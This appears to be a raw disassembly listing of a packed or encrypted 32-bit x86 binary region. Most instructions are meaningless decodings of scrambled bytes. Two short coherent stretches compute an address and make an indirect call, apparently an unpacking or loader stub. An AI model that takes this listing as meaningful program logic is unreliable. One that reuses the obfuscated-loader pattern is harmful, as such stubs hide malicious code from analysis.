  41132a:	dec    ebp
  41132b:	pop    edi
  41132c:	sahf   
  41132d:	fwait
  41132e:	xchg   esi,eax
  41132f:	retf   0x267e
  411332:	cmp    eax,DWORD PTR [esi+eiz*8]
  411335:	das    
  411336:	adc    DWORD PTR [edx-0x65c2f11],ecx
  41133c:	sub    edi,edi
  41133e:	stos   BYTE PTR es:[edi],al
  41133f:	sbb    BYTE PTR [eax],ah
  411341:	push   edx
  411342:	mov    edi,0xb1402b88
  411347:	mov    esp,0x73e7c316
  41134c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41134d:	adc    eax,0xbdb0db97
  411352:	adc    eax,0x92fa37fe
  411357:	pusha  
  411358:	adc    esi,DWORD PTR [edx+0x58fb54f7]
  41135e:	mov    ecx,0x6fafa5fd
  411363:	addr16 jp 0x411329
  411366:	stos   DWORD PTR es:[edi],eax
  411367:	test   BYTE PTR [ebx+edx*1+0x72f486bf],dh
  41136e:	std    
  41136f:	lods   eax,DWORD PTR ds:[esi]
  411370:	xchg   ebp,eax
  411371:	and    esp,ebp
  411373:	out    dx,al
  411374:	dec    ebp
  411375:	cli    
  411376:	pop    ds
  411377:	mov    edi,0x72c04c66
  41137c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41137d:	push   ss
  41137e:	aas    
  41137f:	(bad)  
  411381:	cmp    eax,0x2d2a08f6
  411386:	xchg   eax,edx
  411388:	push   ds
  411389:	pmaddwd mm4,mm1
  41138c:	mov    ah,0x96
  41138e:	push   esp
  41138f:	pop    ecx
  411390:	inc    eax
  411391:	je     0x4113ac
  411393:	xchg   edx,eax
  411394:	test   BYTE PTR [esi-0x33],al
  411397:	or     eax,0x1d1b6083
  41139c:	inc    ebp
  41139d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139e:	in     al,dx
  41139f:	sbb    ah,BYTE PTR [eax-0x24]
  4113a2:	sbb    ebx,DWORD PTR [esi+0x56]
  4113a5:	cdq    
  4113a6:	int    0x21
  4113a8:	inc    esp
  4113a9:	repz mov eax,0xaeb56e69
  4113af:	(bad)
  4113b3:	mov    al,ds:0x688636a2
  4113b8:	cmp    BYTE PTR [edi+0xd],0x5f
  4113bc:	lods   al,BYTE PTR ds:[esi]
  4113bd:	or     DWORD PTR [eax-0x21],ebp
  4113c0:	inc    ecx
  4113c1:	pop    ds
  4113c2:	mov    bl,0x50
  4113c4:	inc    esp
  4113c5:	ja     0x4113e1
  4113c7:	xchg   edi,eax
  4113c8:	or     ecx,esp
  4113ca:	and    BYTE PTR [ebx+edx*1-0x3],dl
  4113ce:	cdq    
  4113cf:	mov    edi,0x25d59d51
  4113d4:	push   esi
  4113d5:	add    BYTE PTR [edi+0x226a6b42],0xee
  4113dc:	pop    ecx
  4113dd:	and    ecx,esi
  4113df:	xchg   ebx,esi
  4113e1:	jne    0x411418
  4113e3:	pushf  
  4113e4:	or     ah,0xbd
  4113e7:	inc    esp
  4113e8:	pop    esp
  4113e9:	stc    
  4113ea:	jp     0x4113db
  4113ec:	mov    esi,0x65869c96
  4113f1:	test   al,0xea
  4113f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113f4:	xor    al,0xd
  4113f6:	adc    al,0xd1
  4113f8:	jae    0x4113b0
  4113fa:	cmp    eax,0x32f85e5c
  4113ff:	jno    0x411431
  411401:	xor    esi,DWORD PTR fs:[esi+0x11]
  411405:	shr    BYTE PTR [eax-0x263fbd77],1
  41140b:	push   eax
  41140c:	(bad)  
  41140d:	retf   0x3651
  411410:	arpl   WORD PTR [ebp+0xc8d978e],bx
  411416:	mov    eax,0x80e8776f
  41141b:	jle    0x4113c7
  41141d:	inc    ebx
  41141e:	dec    esp
  41141f:	stc    
  411420:	mov    dl,0xc6
  411422:	shr    DWORD PTR [edi+0x6e],0xfc
  411426:	cmp    BYTE PTR [edx],bh
  411428:	mov    ah,0x2a
  41142a:	jecxz  0x4113ed
  41142c:	xchg   edi,eax
  41142d:	mov    ecx,0x80a5962e
  411432:	pop    ebp
  411433:	sbb    al,0xe6
  411435:	or     DWORD PTR ds:0xd4e2c936,esi
  41143b:	adc    eax,0xd462091
  411440:	push   ecx
  411441:	xchg   edi,eax
  411442:	jl     0x41140a
  411444:	jbe    0x411463
  411446:	pop    ebp
  411447:	push   ds
  411448:	mov    bl,ah
  41144a:	mov    ah,BYTE PTR [ebx-0x7d]
  41144d:	jne    0x41143a
  41144f:	inc    edx
  411450:	sbb    al,0x56
  411452:	lds    ebx,FWORD PTR [ecx]
  411454:	jo     0x41148c
  411456:	mov    cl,0x6
  411458:	jmp    0xc281aec1
  41145d:	ins    DWORD PTR es:[edi],dx
  41145e:	add    ah,dl
  411460:	je     0x4114b2
  411462:	arpl   bp,bx
  411464:	cmp    al,0x21
  411466:	jne    0x4113fa
  411468:	mov    eax,0x9ae46fd
  41146d:	imul   eax,DWORD PTR [edx],0xdda668db
  411473:	xor    BYTE PTR ds:0x5f7d78da,cl
  411479:	mov    dl,BYTE PTR [esi]
  41147b:	cmc    
  41147c:	sbb    eax,0x5be0487e
  411481:	and    BYTE PTR [ebp-0x2a],bh
  411484:	dec    esp
  411485:	test   DWORD PTR [ebp-0x61],ebp
  411488:	test   BYTE PTR [ecx+0x655350cc],ch
  41148e:	add    DWORD PTR [esi],ebp
  411490:	add    ebx,esp
  411492:	mov    dl,0x6e
  411494:	dec    edi
  411495:	jl     0x411493
  411497:	scas   al,BYTE PTR es:[edi]
  411498:	gs push es
  41149a:	ret    
  41149b:	jp     0x4114c9
  41149d:	cdq    
  41149e:	mov    eax,0xf1e0f8fa
  4114a3:	daa    
  4114a4:	sbb    eax,0xc484be55
  4114a9:	mov    bl,0x84
  4114ab:	bswap  edx
  4114ad:	and    dh,BYTE PTR [ebx+0x20]
  4114b0:	jmp    0xcd0cc2cf
  4114b5:	ins    BYTE PTR es:[edi],dx
  4114b6:	jmp    0x55cc:0x13f7cf3c
  4114bd:	inc    esp
  4114be:	imul   edi,DWORD PTR [edx-0x4e78ea6],0xf447f48d
  4114c8:	or     BYTE PTR [ebx-0x25],bl
  4114cb:	sub    eax,0xe81a6f29
  4114d0:	call   0xafa2:0x966569a0
  4114d7:	out    0x1d,eax
  4114d9:	mov    dl,BYTE PTR [eax]
  4114db:	lods   eax,DWORD PTR ds:[esi]
  4114dc:	aas    
  4114dd:	xchg   ecx,eax
  4114de:	dec    esp
  4114df:	lods   eax,DWORD PTR ds:[esi]
  4114e0:	push   es
  4114e1:	cmp    eax,0x37ca3e0b
  4114e6:	ret    0x6319
  4114e9:	not    BYTE PTR [esi+eiz*1-0x51d06cd]
  4114f0:	stc    
  4114f1:	(bad)  
  4114f2:	mov    al,0x51
  4114f4:	jecxz  0x4114b5
  4114f6:	out    0x28,al
  4114f8:	mov    eax,0x63ec51db
  4114fd:	lahf   
  4114fe:	xor    esp,DWORD PTR [edx-0x757c6c3a]
  411504:	jno    0x411500
  411506:	cwde   
  411507:	nop
  411508:	popa   
  411509:	jp     0x411527
  41150b:	mov    ds:0x21862687,eax
  411510:	add    DWORD PTR [esp+eax*8-0x21],esp
  411514:	in     eax,0x55
  411516:	adc    DWORD PTR [esi],esi
  411518:	test   al,0x4e
  41151a:	mov    al,ds:0x941790b6
  41151f:	pop    edi
  411520:	test   BYTE PTR [ebx],bl
  411522:	int    0x7f
  411524:	cmp    BYTE PTR [ebx+0x793edc08],dl
  41152a:	loope  0x4114e4
  41152c:	fs popa 
  41152e:	sub    al,0xb1
  411530:	mov    dl,BYTE PTR ds:0xc62477a4
  411536:	xlat   BYTE PTR ds:[ebx]
  411537:	stc    
  411538:	mov    ebx,0x6a055664
  41153d:	pop    edx
  41153e:	sub    BYTE PTR [ecx],0xb8
  411541:	retf   0x3d17
  411544:	call   0xdbff2e89
  411549:	cmp    DWORD PTR [esi+eax*2-0x73],ebp
  41154d:	mov    ebp,0xd0ea9feb
  411552:	mov    ds:0xdeca3f9,al
  411557:	js     0x411575
  411559:	out    dx,al
  41155a:	js     0x411549
  41155c:	xchg   ebp,eax
  41155d:	imul   edx,DWORD PTR [esi],0x28
  411560:	sub    eax,0x3223a72
  411565:	pop    ss
  411566:	and    bh,BYTE PTR [ecx+0xc77bf33]
  41156c:	xchg   esi,eax
  41156d:	push   ecx
  41156e:	pop    eax
  41156f:	lods   eax,DWORD PTR ds:[esi]
  411570:	mov    cl,0x1
  411572:	mov    dl,0x78
  411574:	jecxz  0x41157f
  411576:	dec    ebx
  411577:	cmp    eax,0x91b8d68b
  41157c:	aam    0xfb
  41157e:	dec    esp
  41157f:	jnp    0x411560
  411581:	ins    DWORD PTR es:[edi],dx
  411582:	pop    DWORD PTR [ecx]
  411584:	stos   DWORD PTR es:[edi],eax
  411585:	shl    eax,1
  411587:	out    0xfe,al
  411589:	dec    esp
  41158a:	ins    BYTE PTR es:[edi],dx
  41158b:	add    al,BYTE PTR [esi+0x3759c8a6]
  411591:	sahf   
  411592:	mov    bl,0x3d
  411594:	pop    ebx
  411595:	adc    al,0xa9
  411597:	add    ebp,edi
  411599:	call   0x329026ea
  41159e:	mov    bh,0x14
  4115a0:	dec    ebp
  4115a1:	mov    ah,0xb4
  4115a3:	mov    esp,0x973b5a44
  4115a8:	add    edi,DWORD PTR [edx+ebx*4-0x75]
  4115ac:	mov    gs,ebp
  4115ae:	jns    0x4115f3
  4115b0:	data16 outs dx,BYTE PTR ds:[esi]
  4115b2:	in     eax,0x74
  4115b4:	and    eax,0x2a312c66
  4115b9:	mov    DWORD PTR ds:0x2fd41479,eax
  4115bf:	mov    ah,0x19
  4115c1:	sub    BYTE PTR [edi],ah
  4115c3:	sub    ecx,DWORD PTR [esi]
  4115c5:	loop   0x411550
  4115c7:	cmp    dl,ch
  4115c9:	mov    eax,ds:0xe18b731e
  4115ce:	in     eax,dx
  4115cf:	xor    eax,0x29f8a0c6
  4115d4:	jle    0x41164c
  4115d6:	pop    ecx
  4115d7:	mov    DWORD PTR [edx],edi
  4115d9:	mov    ebx,0x71291d83
  4115de:	pusha  
  4115df:	cwde   
  4115e0:	dec    esp
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  esp,QWORD PTR [edx+0x21]
  41160f:	pop    edi
  411610:	mov    esi,0x707040ee
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x41160a
  41161a:	scas   eax,DWORD PTR es:[edi]
  41161b:	lock (bad) 
  41161d:	fld    QWORD PTR [ebp-0x2c7bdd84]
  411623:	das    
  411624:	jecxz  0x4115fc
  411626:	int    0x8f
  411628:	mov    ecx,0x5badfe68
  41162d:	pop    esi
  41162e:	(bad)  
  41162f:	pop    edi
  411630:	out    dx,eax
  411631:	fstp   TBYTE PTR [edx+esi*8+0x99d6914]
  411638:	dec    esp
  411639:	pop    esp
  41163a:	push   0x39e7b8e2
  41163f:	loopne 0x411616
  411641:	(bad)  
  411642:	pop    ds
  411643:	leave  
  411644:	and    BYTE PTR [ebx+0x3adc4c75],bh
  41164a:	stc    
  41164b:	shl    DWORD PTR [eax*8+0x7f785afa],0x70
  411653:	jl     0xd6098133
  411659:	mov    ebx,0x27873f76
  41165e:	in     eax,0x85
  411660:	data16 arpl WORD PTR ds:0x5265dc83,cx
  411667:	jo     0x4116c3
  411669:	mov    ds:0xe6d21e7e,eax
  41166e:	retf   
  41166f:	inc    ebx
  411670:	div    bh
  411672:	adc    BYTE PTR [edx-0xb],dh
  411675:	ins    DWORD PTR es:[edi],dx
  411676:	hlt    
  411677:	mov    ds:0x5af30000,al
  41167c:	dec    edi
  41167d:	dec    edx
  41167e:	adc    eax,0x1aa0c375
  411683:	inc    ebp
  411684:	(bad)  
  411685:	shr    DWORD PTR [esi],1
  411687:	xchg   ebp,eax
  411688:	mov    ah,al
  41168a:	arpl   WORD PTR [edx+0x15c3da7b],cx
  411690:	out    dx,eax
  411691:	test   eax,0x3223b53b
  411696:	xchg   esp,eax
  411697:	arpl   WORD PTR [edx],bp
  411699:	clc    
  41169a:	ds xchg ebx,eax
  41169d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41169e:	call   0xae80:0xbfc6ff5a
  4116a5:	aad    0xa1
  4116a7:	add    BYTE PTR [ebx+0x3fcc5f82],bl
  4116ad:	lahf   
  4116ae:	add    dh,BYTE PTR [edx-0x4926e114]
  4116b4:	push   ss
  4116b5:	pop    ebp
  4116b6:	in     al,dx
  4116b7:	inc    ebp
  4116b8:	jno    0x4116d2
  4116ba:	inc    ebx
  4116bb:	loopne 0x4116c8
  4116bd:	leave  
  4116be:	jnp    0x4116c7
  4116c0:	mov    cl,0xca
  4116c2:	adc    DWORD PTR [esi],edi
  4116c4:	(bad)  
  4116c5:	xor    cl,ah
  4116c7:	push   edx
  4116c8:	nop
  4116c9:	cdq    
  4116ca:	stc    
  4116cb:	jns    0x4116bf
  4116cd:	push   ecx
  4116ce:	adc    ebp,DWORD PTR [edi]
  4116d0:	xchg   esp,eax
  4116d1:	xchg   ebp,eax
  4116d2:	xchg   edx,eax
  4116d3:	cmp    al,0x8c
  4116d5:	add    ebx,edi
  4116d7:	ds call 0xe52e6a57
  4116dd:	lea    ebp,[ebp-0x68218bb2]
  4116e3:	rcl    BYTE PTR [esi],0x52
  4116e6:	jnp    0x411723
  4116e8:	(bad)  
  4116e9:	mov    ebx,0x58044274
  4116ee:	mov    ss:0x30df04f6,al
  4116f4:	xchg   edx,eax
  4116f5:	loope  0x4116f9
  4116f7:	sti    
  4116f8:	clc    
  4116f9:	sbb    eax,0xc8eed234
  4116fe:	adc    esp,eax
  411700:	lds    ebx,FWORD PTR [edx]
  411702:	imul   ebx,DWORD PTR [edx],0xb1eb2d8c
  411708:	inc    esp
  411709:	xchg   edx,eax
  41170a:	pusha  
  41170b:	mov    dl,0xc0
  41170d:	jb     0x41173b
  41170f:	lods   eax,DWORD PTR ds:[esi]
  411710:	sahf   
  411711:	cmp    eax,0x6a53b9b7
  411716:	outs   dx,DWORD PTR ds:[esi]
  411717:	cmp    esi,ebx
  411719:	out    dx,eax
  41171a:	pop    es
  41171b:	mov    cl,0x2f
  41171d:	les    eax,FWORD PTR [esi]
  41171f:	stos   BYTE PTR es:[edi],al
  411720:	popf   
  411721:	mov    al,ds:0x9878226b
  411726:	push   ds
  411727:	or     al,BYTE PTR [ebx+esi*8]
  41172a:	int    0xef
  41172c:	gs push esi
  41172e:	sub    eax,DWORD PTR [edx*2-0x70cb1c44]
  411735:	inc    edi
  411736:	popa   
  411737:	sub    BYTE PTR [ebp+ecx*1-0x50],dl
  41173b:	loopne 0x411799
  41173d:	sbb    eax,0x211f2f16
  411742:	mov    bh,0x9f
  411744:	mov    esp,0x2971bcf7
  411749:	adc    eax,0xb0aeb966
  41174e:	leave  
  41174f:	je     0x411787
  411751:	retf   
  411752:	leave  
  411753:	aas    
  411754:	mov    eax,ds:0x190a09dd
  411759:	sbb    ch,dl
  41175b:	push   0xac3bfb53
  411760:	lock mov ds:0x53661763,eax
  411766:	and    ch,BYTE PTR [esi+0x3f29469f]
  41176c:	dec    ebx
  41176d:	mov    cl,0x6a
  41176f:	mov    WORD PTR [ebp+0x11],cs
  411772:	sbb    dh,BYTE PTR [eax-0x6b]
  411775:	mov    eax,0x4c43feb
  41177a:	imul   ebx,DWORD PTR [esi-0x6e],0x4aa4c2f3
  411781:	in     al,dx
  411782:	xchg   BYTE PTR [ebx+0x790e45c6],dl
  411788:	ficomp WORD PTR [eax+0x77]
  41178b:	mov    al,ds:0x24bf05d9
  411790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411791:	loop   0x41175e
  411793:	mov    al,0x20
  411795:	sahf   
  411796:	leave  
  411797:	into   
  411798:	jmp    FWORD PTR [edx+edx*8+0x6]
  41179c:	mov    eax,ds:0xf78f716c
  4117a1:	adc    DWORD PTR [edx],edi
  4117a3:	ins    BYTE PTR es:[edi],dx
  4117a4:	les    edx,FWORD PTR [ebp+0x7e]
  4117a7:	adc    al,al
  4117a9:	(bad)
  4117ad:	push   edi
  4117ae:	inc    esi
  4117af:	ins    DWORD PTR es:[edi],dx
  4117b0:	out    dx,eax
  4117b1:	jbe    0x411772
  4117b3:	mov    ecx,0x98e5130e
  4117b8:	test   eax,0xa6d7b5c9
  4117bd:	mov    ebp,0xae7b5fea
  4117c2:	push   ss
  4117c3:	push   0x47
  4117c5:	ja     0x411831
  4117c7:	mov    ah,0x73
  4117c9:	popa   
  4117ca:	cli    
  4117cb:	je     0x4117d8
  4117cd:	and    BYTE PTR [eax+0x197b98d0],0x8f
  4117d4:	inc    edi
  4117d5:	shr    BYTE PTR [ebx-0x1f],0x54
  4117d9:	sbb    edi,DWORD PTR [edx+0x610f4fe8]
  4117df:	mov    BYTE PTR [eax],bh
  4117e1:	ja     0x4117b2
  4117e3:	jge    0x4117ff
  4117e5:	xlat   BYTE PTR ds:[ebx]
  4117e6:	or     ah,BYTE PTR [ebx]
  4117e8:	sti    
  4117e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ea:	fistp  QWORD PTR [esi-0x18b54944]
  4117f0:	or     bh,BYTE PTR [ebx-0x5b]
  4117f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117f4:	aas    
  4117f5:	stos   BYTE PTR es:[edi],al
  4117f6:	nop
  4117f7:	(bad)  
  4117f8:	idiv   BYTE PTR [edx-0x1a0b7580]
  4117fe:	jge    0x411831
  411800:	and    ebx,DWORD PTR [ecx]
  411802:	dec    eax
  411803:	push   ecx
  411804:	ret    0x3026
  411807:	push   esp
  411808:	xor    ecx,DWORD PTR [esi]
  41180a:	into   
  41180b:	push   ebx
  41180c:	dec    edx
  41180d:	into   
  41180e:	sbb    ebx,0x8e103341
  411814:	dec    ecx
  411815:	and    eax,0xb12d0a48
  41181a:	fisub  WORD PTR [ebx-0x41]
  41181d:	xor    BYTE PTR [ecx+0x58],bl
  411820:	shl    BYTE PTR [eax+0x4f],cl
  411823:	sub    BYTE PTR [ebx+eax*2+0x68],dh
  411827:	fcomp  QWORD PTR [edx-0x7f]
  41182a:	push   es
  41182b:	std    
  41182c:	nop
  41182d:	ficom  WORD PTR [ebx]
  41182f:	cli    
  411830:	stos   BYTE PTR es:[edi],al
  411831:	and    DWORD PTR [edx+0x3cfa81d9],edx
  411837:	mov    ebp,0xf914602
  41183c:	test   eax,0x4e751933
  411841:	xchg   ecx,eax
  411842:	or     al,0x49
  411844:	mov    BYTE PTR [esi+0x22133760],al
  41184a:	or     al,0xb9
  41184c:	cld    
  41184d:	je     0x411887
  41184f:	push   eax
  411850:	xchg   edi,eax
  411851:	hlt    
  411852:	lock mov ds:0x76f4d47f,eax
  411858:	loopne 0x411868
  41185a:	adc    BYTE PTR [esi+eiz*4],dl
  41185d:	inc    eax
  41185e:	cli    
  41185f:	das    
  411860:	test   DWORD PTR [ecx+0x20],esi
  411863:	fwait
  411864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411865:	sub    eax,0x1d0e55d7
  41186a:	pop    esp
  41186b:	aad    0x49
  41186d:	out    0x82,al
  41186f:	pop    ecx
  411870:	fsub   st(4),st
  411872:	stc    
  411873:	int    0xb7
  411875:	call   0x3b82:0xdbb996bb
  41187c:	out    dx,eax
  41187d:	(bad)  
  41187f:	jmp    0x7610e484
  411884:	clc    
  411885:	add    ch,dl
  411887:	mov    esp,0xf7898ec4
  41188c:	not    ebp
  41188e:	xchg   edx,eax
  41188f:	jg     0x411903
  411891:	lods   al,BYTE PTR ds:[esi]
  411892:	adc    al,0x4b
  411894:	add    DWORD PTR [ecx],ebx
  411896:	lock imul edx,DWORD PTR [esi+eax*2],0xfbf1bff9
  41189e:	aas    
  41189f:	sub    DWORD PTR [esi],ebp
  4118a1:	in     eax,0x8a
  4118a3:	sub    DWORD PTR [edi-0x11],ecx
  4118a6:	mov    ecx,0xe3dd1307
  4118ab:	mov    dh,0xf6
  4118ad:	jle    0x411902
  4118af:	pop    esp
  4118b0:	add    BYTE PTR [ebp+ecx*8-0x40],ah
  4118b4:	pop    ebp
  4118b5:	loopne 0x411844
  4118b7:	aam    0x8b
  4118b9:	push   ds
  4118ba:	xchg   edx,eax
  4118bb:	push   cs
  4118bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118bd:	ficomp WORD PTR [eax+0x55de7ae5]
  4118c3:	or     bh,BYTE PTR [ebx-0x6e]
  4118c6:	mov    dh,0x9a
  4118c8:	lds    ebp,FWORD PTR [ecx-0x65]
  4118cb:	dec    ebx
  4118cc:	xchg   ecx,eax
  4118cd:	sub    DWORD PTR [esi],ebp
  4118cf:	sahf   
  4118d0:	fdivrp st(4),st
  4118d2:	vminps xmm5,xmm5,XMMWORD PTR [eax+0x46]
  4118d7:	pop    ss
  4118d8:	push   esp
  4118d9:	enter  0xa6b4,0x65
  4118dd:	mov    edx,DWORD PTR [esi]
  4118df:	cmc    
  4118e0:	push   ss
  4118e1:	bound  edi,QWORD PTR [ecx]
  4118e3:	retf   
  4118e4:	scas   eax,DWORD PTR es:[edi]
  4118e5:	shr    BYTE PTR [edi+eax*4-0x22a8c2ad],cl
  4118ec:	std    
  4118ed:	out    dx,al
  4118ee:	xchg   ecx,eax
  4118ef:	sbb    DWORD PTR [edx+0x1cf14328],0x960c335b
  4118f9:	inc    edx
  4118fa:	icebp  
  4118fb:	push   esp
  4118fc:	pop    esp
  4118fd:	iret   
  4118fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ff:	jnp    0x411980
  411901:	sti    
  411902:	xor    BYTE PTR [esi+0x61afe2e],0x11
  411909:	shl    ebx,1
  41190b:	ret    0xa1ba
  41190e:	bound  edx,QWORD PTR [ecx-0x547699da]
  411914:	retf   
  411915:	ins    DWORD PTR es:[edi],dx
  411916:	loop   0x4118fd
  411918:	aaa    
  411919:	sub    eax,0x298dddd
  41191e:	(bad)  [esi]
  411920:	lock in eax,0xb2
  411923:	sbb    al,0x5b
  411925:	cs push ecx
  411927:	dec    eax
  411928:	cmp    DWORD PTR [edx+ecx*8-0x6f],0x5b677e86
  411930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411931:	xchg   DWORD PTR [edx+0x5d],ecx
  411934:	xchg   edx,eax
  411935:	cmp    BYTE PTR [ebx+esi*8-0x2028f891],0xba
  41193d:	jecxz  0x4119b7
  41193f:	lea    esi,[edi+0x53]
  411942:	or     DWORD PTR [esi+0x50d88451],edx
  411948:	js     0x4118d6
  41194a:	mov    esi,ss
  41194c:	clc    
  41194d:	jns    0x4118e7
  41194f:	jbe    0x4119ba
  411951:	popf   
  411952:	or     al,0xca
  411954:	xor    BYTE PTR [bp+si-0x548c],ch
  411959:	out    0x46,al
  41195b:	adc    eax,0xe21f0a71
  411960:	push   ecx
  411961:	es jmp 0xc5b7:0xf3cb52d3
  411969:	inc    ebx
  41196a:	outs   dx,BYTE PTR ds:[esi]
  41196b:	fsubr  QWORD PTR [ebx+0x3e57fab3]
  411971:	jnp    0x4119e5
  411973:	cmp    al,bh
  411975:	ret    
  411976:	sub    al,0xa6
  411978:	ret    
  411979:	out    dx,eax
  41197a:	and    bl,BYTE PTR [ecx-0x5e]
  41197d:	jo     0x411903
  41197f:	ds inc ebp
  411981:	out    0x66,al
  411983:	neg    BYTE PTR [esp+eax*4]
  411986:	mov    edx,0x7997c9d8
  41198b:	add    bh,al
  41198d:	addr16 or eax,0x6910e8ba
  411993:	mov    edx,0xf3a765ef
  411998:	fcmovb st,st(1)
  41199a:	jnp    0x411a0c
  41199c:	jmp    0x4119c4
  41199e:	xor    ecx,eax
  4119a0:	out    0xf6,eax
  4119a2:	dec    esi
  4119a3:	mov    BYTE PTR [edi-0x1d9ece0],ah
  4119a9:	inc    eax
  4119aa:	mov    cl,0x17
  4119ac:	xchg   ecx,edx
  4119ae:	(bad)  
  4119b1:	sub    DWORD PTR [ebx+eiz*4+0x23971926],ebx
  4119b8:	push   0x6f
  4119ba:	and    ebx,DWORD PTR [edi-0x4b5392a8]
  4119c0:	clc    
  4119c1:	xchg   esp,eax
  4119c2:	cmp    eax,0xe489f8ee
  4119c7:	ficom  DWORD PTR [ebp-0x4173c882]
  4119cd:	cwde   
  4119ce:	pop    esp
  4119cf:	loope  0x411a1c
  4119d1:	mov    BYTE PTR [edx],al
  4119d3:	inc    edx
  4119d4:	push   ss
  4119d5:	lods   eax,DWORD PTR ds:[esi]
  4119d6:	enter  0x60d6,0xd4
  4119da:	sub    BYTE PTR [eax-0x52],bh
  4119dd:	ror    ch,0x1f
  4119e0:	mov    cl,0xca
  4119e2:	outs   dx,BYTE PTR ds:[esi]
  4119e3:	(bad)  
  4119e4:	fcom   st(1)
  4119e6:	not    BYTE PTR [esi+0xf881e39]
  4119ec:	sub    DWORD PTR [ecx-0x7af05c9f],esp
  4119f2:	(bad)  
  4119f3:	out    dx,eax
  4119f4:	(bad)  
  4119f5:	dec    DWORD PTR [ebx+0x5e9de]
  4119fb:	add    BYTE PTR [eax],al
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x74e0787d
  411a40:	adc    eax,0x70704cc7
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411aac
  411a4a:	(bad)  
  411a4b:	cmp    al,0x84
  411a4d:	add    ch,BYTE PTR [edx-0x7b445d2d]
  411a53:	popa   
  411a54:	mov    edi,0xfed24db5
  411a59:	ss xchg ecx,eax
  411a5b:	fdivr  st(2),st
  411a5d:	sbb    al,0xa3
  411a5f:	xchg   edi,eax
  411a60:	sub    cl,BYTE PTR [edi]
  411a62:	js     0x411a96
  411a64:	jg     0x411aa1
  411a66:	aad    0x9a
  411a68:	mov    edi,0xac12a6fa
  411a6d:	repnz sahf 
  411a6f:	in     eax,0xe4
  411a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a72:	add    bh,cl
  411a74:	loope  0x411a30
  411a76:	dec    ebp
  411a77:	ins    DWORD PTR es:[edi],dx
  411a78:	das    
  411a79:	(bad)  
  411a7b:	in     al,dx
  411a7c:	in     eax,0xe
  411a7e:	sbb    BYTE PTR [edx],dh
  411a80:	mov    edi,0xa4abcbf5
  411a85:	sub    ebp,DWORD PTR [ebp+0x7a]
  411a88:	mov    al,ds:0x5cdbdee1
  411a8d:	mov    WORD PTR [ebx+0x65],?
  411a90:	push   edi
  411a91:	addr16 enter 0xc31d,0x58
  411a96:	pop    eax
  411a97:	(bad)  
  411a98:	aad    0x2b
  411a9a:	sbb    esi,esi
  411a9c:	and    eax,0xd00fac37
  411aa1:	jbe    0x411a2f
  411aa3:	add    dh,BYTE PTR [edx+0x47]
  411aa6:	cdq    
  411aa7:	push   ds
  411aa8:	ror    DWORD PTR [ebx],1
  411aaa:	ret    0x70ae
  411aad:	cwde   
  411aae:	shr    DWORD PTR [ecx+edx*8-0x150ac014],cl
  411ab5:	aaa    
  411ab6:	das    
  411ab7:	out    dx,eax
  411ab8:	jecxz  0x411a7e
  411aba:	sbb    BYTE PTR [edx+0x75],dh
  411abd:	pushf  
  411abe:	jnp    0x411b33
  411ac0:	cwde   
  411ac1:	cmp    BYTE PTR [ebx+0xe],ch
  411ac4:	fild   DWORD PTR [ebx+0x78]
  411ac7:	push   eax
  411ac8:	outs   dx,DWORD PTR ds:[esi]
  411ac9:	and    cl,BYTE PTR [ebp-0x1ca0c603]
  411acf:	shl    DWORD PTR [edx-0xd98438a],0x6c
  411ad6:	push   eax
  411ad7:	scas   al,BYTE PTR es:[edi]
  411ad8:	push   edx
  411ad9:	adc    ebx,edi
  411adb:	pop    eax
  411adc:	les    sp,DWORD PTR [eax-0x6a]
  411ae0:	imul   ebp,DWORD PTR [ebx+0x478d20e1],0x95cebe5a
  411aea:	pop    edx
  411aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aec:	xor    eax,DWORD PTR [ebp+0x99d3d37]
  411af2:	sbb    ah,dh
  411af4:	(bad)  
  411af5:	sbb    al,0x3a
  411af7:	jmp    0x655c838
  411afc:	xor    BYTE PTR [ebx],0xb
  411aff:	sbb    al,0xea
  411b01:	bound  esi,QWORD PTR [edx]
  411b03:	xchg   DWORD PTR [ebx],esi
  411b05:	ins    DWORD PTR es:[edi],dx
  411b06:	add    DWORD PTR ds:0xd26f1036,edi
  411b0c:	test   DWORD PTR [ecx+ebx*2],eax
  411b0f:	adc    BYTE PTR ds:0x56a41ed7,bh
